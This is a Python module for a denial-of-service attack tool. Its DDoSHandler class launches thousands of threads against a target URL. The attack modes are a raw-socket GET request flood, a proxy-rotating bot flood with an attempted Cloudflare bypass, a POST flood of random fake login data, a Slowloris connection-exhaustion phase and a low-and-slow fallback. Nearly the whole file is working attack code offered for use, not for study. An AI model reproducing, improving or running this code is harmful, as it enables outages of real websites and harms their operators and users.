#!/usr/bin/env python3
"""
DDOS HANDLER MODULE
Attack coordination and management
"""

import time
import random
from threading import Thread, Lock
from queue import Queue
from colorama import Fore, Style

class DDoSHandler:
    def __init__(self, target_url, method, threads=1000, instant_mode=False):
        self.target_url = target_url
        self.method = method
        self.threads = min(threads, 10000)
        self.instant_mode = instant_mode
        self.active = False
        self.request_count = 0
        self.lock = Lock()
        
        # Import other handlers
        from bypass_handler import BypassHandler
        from thread_handler import ThreadManager
        from attack_methods import AttackMethods
        
        self.bypass = BypassHandler()
        self.thread_mgr = ThreadManager(max_threads=self.threads)
        self.attacks = AttackMethods(target_url)
    
    def start_attack(self):
        """Start DDoS attack based on selected method"""
        print(f"\n{Fore.CYAN}[*] Initializing {self.method}...")
        print(f"{Fore.CYAN}[*] Target: {self.target_url}")
        print(f"{Fore.CYAN}[*] Threads: {self.threads}")
        print(f"{Fore.CYAN}[*] Instant Mode: {'Enabled' if self.instant_mode else 'Disabled'}")
        print(f"{Fore.YELLOW}[!] Starting attack in 3 seconds...")
        
        time.sleep(3)
        
        self.active = True
        
        if "Request Spammer" in self.method:
            self._start_request_spammer()
        elif "HTTP/HTTPS" in self.method:
            self._start_http_attack()
        elif "Multifactor" in self.method:
            self._start_multifactor()
    
    def _start_request_spammer(self):
        """Method 1: Basic request spam"""
        print(f"{Fore.GREEN}[+] Starting Request Spammer attack...")
        
        # Calculate attack parameters
        requests_per_thread = 1000 if self.instant_mode else 100
        total_requests = self.threads * requests_per_thread
        
        print(f"{Fore.CYAN}[*] Estimated total requests: {total_requests:,}")
        
        # Start threads
        threads = []
        for i in range(self.threads):
            t = Thread(target=self._spam_worker, args=(i, requests_per_thread))
            t.daemon = True
            threads.append(t)
            t.start()
        
        # Monitor attack
        try:
            start_time = time.time()
            while self.active:
                with self.lock:
                    current_count = self.request_count
                
                elapsed = time.time() - start_time
                rps = current_count / elapsed if elapsed > 0 else 0
                
                print(f'\r{Fore.MAGENTA}[+] Active: {len(threads)} threads | '
                      f'Requests: {current_count:,} | '
                      f'RPS: {rps:.0f}', end='', flush=True)
                
                time.sleep(0.5)
                
                # Auto-stop after certain requests
                if current_count >= total_requests * 0.8:
                    self.active = False
                    
        except KeyboardInterrupt:
            self.active = False
            print(f"\n{Fore.YELLOW}[!] Attack interrupted")
        finally:
            self.active = False
            time.sleep(1)
            print(f"\n{Fore.GREEN}[✓] Attack completed. Total requests: {self.request_count:,}")
    
    def _spam_worker(self, worker_id, max_requests):
        """Worker thread for request spam"""
        import socket
        import ssl
        from urllib.parse import urlparse
        
        try:
            parsed = urlparse(self.target_url)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            if parsed.scheme == 'https':
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=host)
            
            # Connect
            sock.connect((host, port))
            
            # Generate request
            request = f"GET {parsed.path or '/'} HTTP/1.1\r\n"
            request += f"Host: {host}\r\n"
            request += f"User-Agent: {self._random_user_agent()}\r\n"
            request += "Accept: */*\r\n"
            request += "Connection: keep-alive\r\n"
            request += "\r\n"
            
            # Send requests
            for i in range(max_requests):
                if not self.active:
                    break
                
                try:
                    sock.send(request.encode())
                    # Don't wait for response
                    
                    with self.lock:
                        self.request_count += 1
                    
                    if self.instant_mode:
                        time.sleep(random.uniform(0.001, 0.01))
                    else:
                        time.sleep(random.uniform(0.01, 0.1))
                        
                except:
                    # Reconnect on error
                    sock.close()
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    if parsed.scheme == 'https':
                        sock = context.wrap_socket(sock, server_hostname=host)
                    sock.connect((host, port))
                    
        except Exception as e:
            pass
        finally:
            try:
                sock.close()
            except:
                pass
    
    def _start_http_attack(self):
        """Method 2: HTTP attack with Cloudflare bypass"""
        print(f"{Fore.GREEN}[+] Starting HTTP/HTTPS attack with Cloudflare bypass...")
        
        # Load proxies
        proxies = self.bypass.load_proxies()
        print(f"{Fore.CYAN}[*] Loaded {len(proxies)} proxies")
        
        # Bypass Cloudflare
        if self.bypass.detect_cloudflare(self.target_url):
            print(f"{Fore.YELLOW}[!] Cloudflare detected. Attempting bypass...")
            bypass_success = self.bypass.bypass_cloudflare_v2_5(self.target_url)
            
            if bypass_success:
                print(f"{Fore.GREEN}[✓] Cloudflare bypass successful!")
            else:
                print(f"{Fore.RED}[!] Cloudflare bypass failed, continuing with basic attack")
        
        # Start bot attack
        self._start_bot_attack(proxies)
    
    def _start_bot_attack(self, proxies):
        """Bot-based attack with proxy rotation"""
        print(f"{Fore.CYAN}[*] Starting bot simulation with proxy rotation...")
        
        threads = []
        requests_per_bot = 500 if self.instant_mode else 100
        
        for i in range(min(self.threads, 500)):  # Max 500 bots
            t = Thread(target=self._bot_worker, args=(i, requests_per_bot, proxies))
            t.daemon = True
            threads.append(t)
        
        # Start in batches
        batch_size = 50
        for i in range(0, len(threads), batch_size):
            batch = threads[i:i+batch_size]
            for t in batch:
                t.start()
                time.sleep(0.01)  # Stagger starts
            
            print(f"{Fore.MAGENTA}[+] Started batch {i//batch_size + 1}")
            time.sleep(0.5 if self.instant_mode else 1)
        
        # Monitor
        start_time = time.time()
        try:
            while self.active:
                elapsed = time.time() - start_time
                with self.lock:
                    rps = self.request_count / elapsed if elapsed > 0 else 0
                
                print(f'\r{Fore.MAGENTA}[+] Bots: {len(threads)} | '
                      f'Requests: {self.request_count:,} | '
                      f'RPS: {rps:.0f} | '
                      f'Proxies: {len(proxies)}', end='', flush=True)
                
                time.sleep(0.5)
                
                if elapsed > 30:  # Run for 30 seconds max
                    self.active = False
                    
        except KeyboardInterrupt:
            self.active = False
        finally:
            self.active = False
            time.sleep(2)
            print(f"\n{Fore.GREEN}[✓] Bot attack completed")
    
    def _bot_worker(self, bot_id, max_requests, proxies):
        """Individual bot worker"""
        import requests
        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry
        
        session = requests.Session()
        
        # Configure retry strategy
        retry_strategy = Retry(
            total=3,
            backoff_factor=0.5,
            status_forcelist=[429, 500, 502, 503, 504]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        # Rotate proxies
        proxy = random.choice(proxies) if proxies else None
        
        for i in range(max_requests):
            if not self.active:
                break
            
            try:
                headers = self.bypass.generate_headers()
                
                if proxy:
                    proxies_dict = {'http': proxy, 'https': proxy}
                else:
                    proxies_dict = None
                
                # Send request
                response = session.get(
                    self.target_url,
                    headers=headers,
                    proxies=proxies_dict,
                    timeout=5,
                    verify=False
                )
                
                with self.lock:
                    self.request_count += 1
                
                # Rotate proxy occasionally
                if i % 10 == 0 and proxies:
                    proxy = random.choice(proxies)
                
                if self.instant_mode:
                    time.sleep(random.uniform(0.001, 0.005))
                else:
                    time.sleep(random.uniform(0.05, 0.2))
                    
            except:
                # Try new proxy on error
                if proxies:
                    proxy = random.choice(proxies)
                continue
    
    def _start_multifactor(self):
        """Method 3: Multifactor attack with fallback"""
        print(f"{Fore.GREEN}[+] Starting Multifactor Fall Back attack...")
        print(f"{Fore.CYAN}[*] Sequential attack pattern activated")
        
        # Phase 1: Basic flood
        print(f"{Fore.YELLOW}[*] Phase 1: Basic Request Flood")
        self._basic_flood_phase()
        
        if self.active:
            # Phase 2: POST data flood
            print(f"{Fore.YELLOW}[*] Phase 2: POST Data Flood")
            self._post_flood_phase()
        
        if self.active:
            # Phase 3: Slowloris attack
            print(f"{Fore.YELLOW}[*] Phase 3: Slowloris Attack")
            self._slowloris_phase()
        
        if self.active:
            # Phase 4: Silent fallback
            print(f"{Fore.YELLOW}[*] Phase 4: Silent Fallback Mode")
            self._silent_fallback()
        
        print(f"{Fore.GREEN}[✓] Multifactor attack sequence completed")
    
    def _basic_flood_phase(self):
        """Phase 1: Basic flood"""
        threads = []
        for i in range(self.threads // 3):
            t = Thread(target=self._spam_worker, args=(i, 200))
            t.daemon = True
            threads.append(t)
            t.start()
        
        time.sleep(10 if self.instant_mode else 30)
    
    def _post_flood_phase(self):
        """Phase 2: POST data flood"""
        import requests
        
        def post_worker(worker_id):
            session = requests.Session()
            for _ in range(100):
                if not self.active:
                    break
                
                try:
                    # Generate random POST data
                    data = {
                        'username': self._random_string(10),
                        'password': self._random_string(15),
                        'email': f"{self._random_string(8)}@example.com",
                        'csrf': self._random_string(32)
                    }
                    
                    session.post(
                        self.target_url,
                        data=data,
                        timeout=3,
                        verify=False
                    )
                    
                    with self.lock:
                        self.request_count += 1
                        
                except:
                    pass
        
        threads = []
        for i in range(self.threads // 4):
            t = Thread(target=post_worker, args=(i,))
            t.daemon = True
            threads.append(t)
            t.start()
        
        time.sleep(8 if self.instant_mode else 25)
    
    def _slowloris_phase(self):
        """Phase 3: Slowloris attack"""
        import socket
        
        def slowloris_worker(worker_id):
            try:
                parsed = urlparse(self.target_url)
                host = parsed.hostname
                port = parsed.port or 80
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((host, port))
                
                # Send incomplete request
                request = f"POST {parsed.path or '/'} HTTP/1.1\r\n"
                request += f"Host: {host}\r\n"
                request += "Content-Length: 1000000\r\n"
                request += "\r\n"
                
                sock.send(request.encode())
                
                # Keep connection alive
                while self.active:
                    sock.send(b"X-a: b\r\n")
                    time.sleep(10 if self.instant_mode else 30)
                    
            except:
                pass
        
        from urllib.parse import urlparse
        
        threads = []
        for i in range(min(self.threads // 10, 100)):
            t = Thread(target=slowloris_worker, args=(i,))
            t.daemon = True
            threads.append(t)
            t.start()
        
        time.sleep(15 if self.instant_mode else 40)
    
    def _silent_fallback(self):
        """Phase 4: Silent fallback"""
        print(f"{Fore.CYAN}[*] Silent fallback: Low and slow attack")
        
        def silent_worker(worker_id):
            import requests
            import random
            
            session = requests.Session()
            delay = random.uniform(5, 15) if self.instant_mode else random.uniform(30, 60)
            
            while self.active:
                try:
                    session.get(self.target_url, timeout=10, verify=False)
                    
                    with self.lock:
                        self.request_count += 1
                    
                    time.sleep(delay)
                except:
                    time.sleep(delay * 2)
        
        threads = []
        for i in range(min(self.threads, 50)):
            t = Thread(target=silent_worker, args=(i,))
            t.daemon = True
            threads.append(t)
            t.start()
        
        time.sleep(20 if self.instant_mode else 60)
    
    def _random_user_agent(self):
        """Generate random user agent"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36'
        ]
        return random.choice(agents)
    
    def _random_string(self, length):
        """Generate random string"""
        import string
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
